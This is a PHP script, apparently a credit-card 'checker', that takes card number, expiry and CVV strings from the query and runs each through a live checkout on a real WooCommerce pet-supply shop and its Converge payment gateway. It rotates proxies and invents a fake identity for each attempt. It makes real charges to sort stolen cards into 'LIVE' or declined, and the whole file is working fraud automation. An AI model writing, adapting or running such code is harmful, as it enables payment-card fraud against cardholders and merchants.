<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $list = file('proxy.txt');
    $proxylist = $list[rand(0, count($list) - 1)];
    $separate = explode(":", $proxylist);
    $proxy = $separate[0];
    $port = $separate[1];
    $proxyUser = $separate[2];
    $proxyPass = $separate[3];

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://rufflandkennels.com/product/top-tray-hardware/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: multipart/form-data; boundary=----WebKitFormBoundarygCpMSx63BzrJmDxq',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "------WebKitFormBoundarygCpMSx63BzrJmDxq\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundarygCpMSx63BzrJmDxq\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n169318\r\n------WebKitFormBoundarygCpMSx63BzrJmDxq--"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://rufflandkennels.com/checkout/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $nonce = GetStr(curl_exec($ch), 'name="woocommerce-process-checkout-nonce" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://rufflandkennels.com/?wc-ajax=checkout',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=$state&billing_postcode=$postcode&billing_phone=$phone&billing_email=$fname$lname@gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&reference_number=&order_comments=&shipping_method%5B0%5D=38221_First-Class+Mail+Package+Service&payment_method=elavon_converge_credit_card&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
    ));
    $cock = GetStr(urldecode(stripslashes(curl_exec($ch))), '"redirect":"', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $cock,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $ragnarsson = curl_exec($ch);
    curl_close($ch);

    $orderId = GetStr($ragnarsson, '"order_id":', ',');
    $securityguard = GetStr($ragnarsson, '"transaction_token_nonce":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://rufflandkennels.com/wp-admin/admin-ajax.php?action=wc_elavon_vm_get_transaction_token&security=$securityguard&gateway_id=elavon_converge_credit_card&order_id=$orderId&tokenize_payment_method=false&test_amount=",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $bitoy = curl_exec($ch);
    curl_close($ch);

    $invoice = GetStr($bitoy, '"ssl_invoice_number":"', '"');
    $token = GetStr($bitoy, '"transaction_token":"', '"');
    $customerCode = GetStr($bitoy, '"ssl_customer_code":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://www.convergepay.com/hosted-payments/service/payment/hpe/process",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYPORT => $port,
        CURLOPT_PROXYUSERPWD => $proxyUser.':'.$proxyPass,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"fields":{"ssl_transaction_type":"ccsale","ssl_invoice_number":"'.$invoice.'","ssl_amount":"6.90","ssl_salestax":"0","ssl_first_name":"'.$fname.'","ssl_last_name":"'.$lname.'","ssl_company":"","ssl_avs_address":"'.$street.'","ssl_address2":"","ssl_city":"'.$city.'","ssl_state":"'.$state.'","ssl_avs_zip":"'.$postcode.'","ssl_country":"USA","ssl_email":"'.$fname.''.$lname.'@gmail.com","ssl_phone":"'.$phone.'","ssl_cardholder_ip":"'.$proxy.'","ssl_customer_code":"'.$customerCode.'","ssl_cvv2cvc2_indicator":1,"ssl_description":'.$orderId.',"ssl_card_number":"'.$cc.'","ssl_exp_date":"'.$mm.''.substr($yy, 2, 4).'","ssl_cvv2cvc2":"'.$cvv.'","ssl_txn_auth_token":"'.$token.'"}}'
    ));
    $otogz = curl_exec($ch);
    curl_close($ch);

    $dcode = GetStr($otogz, '"ssl_issuer_response":"', '"');
    $message = GetStr($otogz, '"ssl_result_message":"', '"');
    $cvvRes = GetStr($otogz, '"ssl_cvv2_response":"', '"');

    $response = "[$dcode: $message | CV2: $cvvRes]";

    if(strpos($otogz, '"approved":true')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$response.'</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td> <td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-primary badge-pill">'.$proxy.':'.$port.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("$cookie.txt");
?>
